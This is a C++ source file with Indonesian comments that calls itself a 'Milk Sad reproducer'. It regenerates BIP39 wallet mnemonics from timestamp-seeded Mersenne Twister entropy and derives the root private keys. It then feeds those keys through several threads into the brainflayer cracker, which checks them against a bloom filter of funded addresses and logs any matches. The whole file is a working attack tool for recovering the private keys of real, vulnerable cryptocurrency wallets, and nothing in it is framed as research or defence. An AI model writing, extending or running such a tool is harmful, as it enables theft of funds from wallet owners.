#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cstring>
#include <thread>
#include <atomic>
#include <mutex>
#include <climits>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

// --- KONFIGURASI ---
const std::string WORDLIST_FILENAME = "english.txt";
const uint64_t REPORT_INTERVAL = 200000; // Lapor setiap 200k key
const int DEFAULT_NUM_THREADS = 4;
std::atomic<bool> g_stop_flag(false);

// --- HELPER SYSTEM ---
bool file_exists(const std::string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}

std::string get_absolute_path(const std::string& relative_path) {
    char path[PATH_MAX];
    if (realpath(relative_path.c_str(), path) != NULL) {
        return std::string(path);
    }
    return relative_path; 
}

// --- CRYPTO & BIP39 ---
std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    std::mt19937 engine(seed_value);
    std::vector<uint8_t> entropy(32);
    for (size_t i = 0; i < 32; i += 4) {
        uint32_t random_block = engine();
        std::memcpy(&entropy[i], &random_block, 4);
    }
    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];
    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte);
    std::string mnemonic;
    mnemonic.reserve(256);
    for (int i = 0; i < 24; ++i) {
        int start_bit = i * 11;
        int word_index = 0;
        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8);
            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }
        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }
    return mnemonic;
}

std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    const int iterations = 2048;
    const std::string salt = "mnemonic";
    std::vector<uint8_t> seed(64);
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) return "";

    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    HMAC(EVP_sha512(), reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), hmac_result, &hmac_len);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    return ss.str();
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::string paths[] = { filename, "Wordlist/" + filename, "../Wordlist/" + filename, "./brainflayer/" + filename };
    std::ifstream file;
    for (const auto& p : paths) { if (file_exists(p)) { file.open(p); break; } }
    if (!file.is_open()) throw std::runtime_error("Wordlist not found!");
    std::string word;
    while (std::getline(file, word)) {
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first != std::string::npos)
            wordlist.push_back(word.substr(first, word.find_last_not_of(" \t\r\n") - first + 1));
    }
    return wordlist;
}

// --- WORKER THREAD (FIXED) ---
void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::mutex& print_mtx,
                   const std::string& cmd_template) {
    
    std::string log_file = "found_thread_" + std::to_string(thread_id) + ".txt";
    // Redirect output ke file log
    std::string final_cmd = cmd_template + " > " + log_file + " 2>&1";
    
    FILE* pipe = popen(final_cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] Error opening pipe!" << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        // Kirim ke stdin brainflayer
        // Jika fprintf gagal (return < 0), berarti pipe putus (brainflayer mati/selesai)
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) break;

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        if (local_processed % REPORT_INTERVAL == 0) {
            std::lock_guard<std::mutex> lock(print_mtx);
            std::cout << "[Thread " << thread_id << "] TS: " << ts << " | Done: " << local_processed << std::endl;
        }
    }
    
    pclose(pipe);
}

// --- MAIN PROGRAM ---
void signal_handler(int) { g_stop_flag = true; }

int main() {
    signal(SIGPIPE, SIG_IGN); 
    signal(SIGINT, signal_handler);
    OpenSSL_add_all_algorithms();

    std::cout << "=== MILK SAD REPRODUCER (FIXED ARGS) ===" << std::endl;

    // 1. DETEKSI PATH
    std::string bf_path, blf_path;
    if (file_exists("./brainflayer/brainflayer")) bf_path = get_absolute_path("./brainflayer/brainflayer");
    else if (file_exists("./brainflayer")) bf_path = get_absolute_path("./brainflayer");
    else { std::cerr << "Brainflayer not found!" << std::endl; return 1; }

    if (file_exists("040823BF.blf")) blf_path = get_absolute_path("040823BF.blf");
    else if (file_exists("./brainflayer/040823BF.blf")) blf_path = get_absolute_path("./brainflayer/040823BF.blf");
    else { std::cerr << "Bloom filter not found!" << std::endl; return 1; }

    // 2. LOAD WORDLIST
    std::vector<std::string> wordlist;
    try { wordlist = load_wordlist(WORDLIST_FILENAME); } 
    catch (std::exception& e) { std::cerr << e.what() << std::endl; return 1; }

    // 3. INPUT
    int mode;
    std::cout << "Mode (1:Range, 2:Full): "; std::cin >> mode;
    uint32_t start_ts = 0, end_ts = 0;
    
    if (mode == 1) {
        std::string s_date, e_date;
        std::cout << "Start (YYYY-MM-DD): "; std::cin >> s_date;
        std::cout << "End   (YYYY-MM-DD): "; std::cin >> e_date;
        struct tm tm = {};
        strptime(s_date.c_str(), "%Y-%m-%d", &tm); start_ts = mktime(&tm);
        tm = {}; strptime(e_date.c_str(), "%Y-%m-%d", &tm);
        tm.tm_hour = 23; tm.tm_min = 59; tm.tm_sec = 59; end_ts = mktime(&tm);
    } else { end_ts = UINT_MAX; }

    int threads_count = DEFAULT_NUM_THREADS;
    std::cout << "Threads: "; if (std::cin.peek() != '\n') std::cin >> threads_count;

    // --- COMMAND FIX IS HERE ---
    // HAPUS "-i -"
    std::string cmd_template = bf_path + " -v -b " + blf_path + " -t priv -x";
    
    std::cout << "\n[*] Running: " << cmd_template << std::endl;
    std::cout << "[*] Scanning..." << std::endl;

    std::vector<std::thread> threads;
    std::atomic<uint64_t> global_counter(0);
    std::mutex print_mtx;
    uint64_t chunk = ((uint64_t)end_ts - start_ts) / threads_count;

    for(int i=0; i<threads_count; i++) {
        uint32_t t_s = start_ts + (i * chunk);
        uint32_t t_e = (i == threads_count-1) ? end_ts : t_s + chunk - 1;
        threads.emplace_back(worker_thread, t_s, t_e, i, 
                             std::cref(wordlist), std::ref(global_counter), std::ref(print_mtx),
                             cmd_template);
    }

    for(auto& t : threads) t.join();
    std::cout << "\n[DONE] Check found_thread_*.txt" << std::endl;
    return 0;
}
